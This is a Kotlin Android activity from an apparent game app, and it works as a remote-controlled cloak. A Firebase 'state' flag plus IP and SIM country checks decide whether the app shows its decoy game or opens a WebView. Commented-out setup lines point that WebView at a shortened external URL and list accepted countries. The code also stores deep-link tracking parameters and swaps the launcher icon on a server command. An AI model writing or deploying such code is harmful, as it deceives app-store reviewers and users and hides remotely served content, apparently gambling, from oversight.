package com.funapps.gje

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import bolts.AppLinks
import com.facebook.applinks.AppLinkData
import com.google.firebase.messaging.FirebaseMessaging
import com.truelove.kotlinplatinarush.model.PreferencesHelper
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.disposables.Disposable
import io.reactivex.schedulers.Schedulers
import kotlinx.android.synthetic.main.activity_load.*
import java.io.InvalidClassException
import android.content.pm.PackageManager
import android.telephony.TelephonyManager
import android.net.ConnectivityManager
import android.net.NetworkInfo
import com.google.firebase.database.*


class LoadActivity: AppCompatActivity() {
    companion object {
        const val TAG = "LoadActivity"
    }

    var disposable: Disposable? = null
    private lateinit var pathSegments: List<String>
    private var mCountry: String = ""
    private var isStart = false
    private var mState = false
    private lateinit var myRef: DatabaseReference

    private val mICountryApi by lazy {
        App.create()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_load)

        initFirebase()
        showProgress()

        FirebaseMessaging.getInstance().subscribeToTopic("pharaon")
            .addOnSuccessListener { println("!!!") }

        FirebaseMessaging.getInstance().subscribeToTopic("country_" + getCountry())
            .addOnSuccessListener { println("!!!") }

        val iconsList = resources.getStringArray(R.array.iconsList).asList()

//        myRef.child("AcceptCountry")
//            .setValue("AU, AT, AZ, AL, DZ, AS, AI, AO, AD, AG, AR, AM, AW, AF, BS, BD, BB, BH, BY, BZ, BE, BJ, BM, BG, BO, BA, BW, BR, BN, BF, BI, BT, VU, HU, VE, VG, VI, TP, VN, GA, HT, GY, GM, GH, GP, GT, GN, GW, DE, GI, HN, HK, GD, GL, GR, GE, GU, DK, DJ, DM, DO, EG, ZM, EH, ZW, IL, IN, ID, JO, IQ, IR, IE, IS, ES, IT, YE, CV, KZ, KH, CM, CA, QA, KE, CY, KG, KI, CN, CO, KM, CG, CD, KP, KR, CR, CI, CU, KW, LA, LV, LS, LR, LB, LY, LT, LI, LU, MU, MR, MG, MO, MK, MW, MY, ML, MV, MT, MA, MQ, MH, MX, FM, MZ, MD, MC, MN, MS, MM, NA, NR, NP, NE, NG, AN, NL, NI, NU, NZ, NC, NO, AE, OM, IM, NF, KY, CK, TC, PK, PW, PS, PA, VA, PG, PY, PE, PN, PL, PT, PR, RE, RU, RW, RO, SV, WS, SM, ST, SA, SZ, SH, MP, SC, SN, VC, KN, LC, PM, SG, SY, SK, SI, GB, UK, US, SB, SO, SD, SR, SL, TJ, TH, TZ, TG, TK, TO, TT, TV, TN, TM, TR, UG, UZ, UA, WE, UY, FO, FJ, PH, FI, FK, FR, GF, PF, HR, CF, TD, CZ, CL, CH, SE, SJ, LK, EC, GQ, ER, EE, ET, YU, ZA, JM, JP");
//        myRef.child("state").setValue(true);
//        myRef.child("url").setValue("https://dssm.us/2310Sg1");
//        myRef.child("listIcon").setValue("default");

        AppLinkData.fetchDeferredAppLinkData(this,
            object : AppLinkData.CompletionHandler {
                override fun onDeferredAppLinkDataFetched(appLinkData: AppLinkData?) {
                    if (appLinkData != null) {
                        try {
                            pathSegments = appLinkData.getTargetUri().getPathSegments()
                            if (pathSegments != null) {
                                PreferencesHelper().savePreference("sub1", pathSegments[0])
                                PreferencesHelper().savePreference("sub2", pathSegments[1])
                                PreferencesHelper().savePreference("sub3", pathSegments[2])
                                PreferencesHelper().savePreference("sub4", pathSegments[3])
                            }
                            Log.i(
                                "TAG",
                                "Deep link receive: " + appLinkData.getTargetUri().getLastPathSegment()
                            )
                        } catch (e: NullPointerException) {
                            e.printStackTrace()
                        } catch (e: InvalidClassException) {
                            e.printStackTrace()
                        }
                    } else {
                        try {
                            var targetUri =
                                AppLinks.getTargetUrlFromInboundIntent(applicationContext, intent)
                            if (targetUri!=null) {
                                pathSegments = targetUri.pathSegments
                                if (pathSegments != null) {
                                    PreferencesHelper().savePreference("sub1", pathSegments[0])
                                    PreferencesHelper().savePreference("sub2", pathSegments[1])
                                    PreferencesHelper().savePreference("sub3", pathSegments[2])
                                    PreferencesHelper().savePreference("sub4", pathSegments[3])
                                }
                            }
                        } catch (e: NullPointerException) {
                            e.printStackTrace()
                        } catch (e: InvalidClassException) {
                            e.printStackTrace()
                        }
                    }
                }
            }
        )

        myRef.child("listIcon").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(dataSnapshot: DataSnapshot) {
                // This method is called once with the initial value and again
                // whenever data at this location is updated.
                val value = dataSnapshot.getValue(String::class.java)
                Log.d(TAG, "Value is: $value")
                if (iconsList.contains(value)) {
                    if (value != null) {
                        changeIcon(value)
                    }
                }
            }

            override fun onCancelled(error: DatabaseError) {
                // Failed to read value
                Log.w(TAG, "Failed to read value.", error.toException())
            }
        })

        myRef.child("state").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(dataSnapshot: DataSnapshot) {
                // This method is called once with the initial value and again
                // whenever data at this location is updated.
                val value = dataSnapshot.getValue(Boolean::class.java)
                Log.d(TAG, "Value is: $value")
                try {
                    PreferencesHelper().savePreference("state", value)
                    mState = true
                } catch (e: InvalidClassException) {
                    e.printStackTrace()
                }

                if (mCountry != null && !isStart) {
                    val myInt = if (value!!) 1 else 0
                    when (myInt) {
                        1 -> startActivity(Intent(this@LoadActivity, MyWebView::class.java))
                        0 -> startActivity(Intent(this@LoadActivity, MainActivity::class.java))
                    }
                    isStart = true
                }
            }

            override fun onCancelled(error: DatabaseError) {
                // Failed to read value
                Log.w(TAG, "Failed to read value.", error.toException())
            }
        })

        if (hasConnection(this)) {
            disposable = mICountryApi.getCountryCode("json/")
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(
                    { result ->
                        mCountry = result.countryCode
                        Log.d(TAG, "${mCountry} result found")
                        PreferencesHelper().savePreference("country", mCountry)
                        if (!isStart && mState) {
                            if (PreferencesHelper().getSharedPreferences().getBoolean("state", false)) {
                                startActivity(Intent(this@LoadActivity, MyWebView::class.java))
                            } else {
                                startActivity(Intent(this@LoadActivity, MainActivity::class.java))
                            }
                            isStart = true
                        }
                    },
                    { error -> Toast.makeText(this, error.message, Toast.LENGTH_SHORT).show() }
                )
        } else {
            Log.d("LoadActivity1", "No connect")
        }
    }

    fun hasConnection(context: Context): Boolean {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        var wifiInfo: NetworkInfo? = cm.getNetworkInfo(ConnectivityManager.TYPE_WIFI)
        if (wifiInfo != null && wifiInfo.isConnected) {
            return true
        }
        wifiInfo = cm.getNetworkInfo(ConnectivityManager.TYPE_MOBILE)
        if (wifiInfo != null && wifiInfo.isConnected) {
            return true
        }
        wifiInfo = cm.activeNetworkInfo
        return wifiInfo != null && wifiInfo.isConnected
    }

    private fun initFirebase() {
        myRef = FirebaseDatabase.getInstance().getReference()
    }

    private fun showProgress() {
        var speed = 105
        Thread(Runnable {
            var progress = 0

            while (progress < 100) {

                speed--
                Thread.sleep(speed.toLong())
                pb_horizontal.setProgress(progress)
                //Log.d(TAG, "Progress: " + progress)

                progress++
            }
            if (!isStart) {
                startActivity(Intent(this@LoadActivity, MainActivity::class.java))
                isStart = true
            }
        }).start()
    }

    fun getCountry(): String {
        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        return telephonyManager.simCountryIso.toLowerCase()
    }

    private fun changeIcon(name: String) {
        val prefs = getSharedPreferences("prefs", Context.MODE_PRIVATE)
        if(prefs.getString("alias-name", "") != name) {
            val pm = packageManager
            try {
                pm.setComponentEnabledSetting(
                    ComponentName(this, "$packageName.$name"),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )
                pm.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
            } catch (e: Exception) {
                e.printStackTrace()

            }
            prefs.edit().putString("alias-name", name).apply()
        }
    }

    override fun onPause() {
        super.onPause()
        disposable?.dispose()
    }
}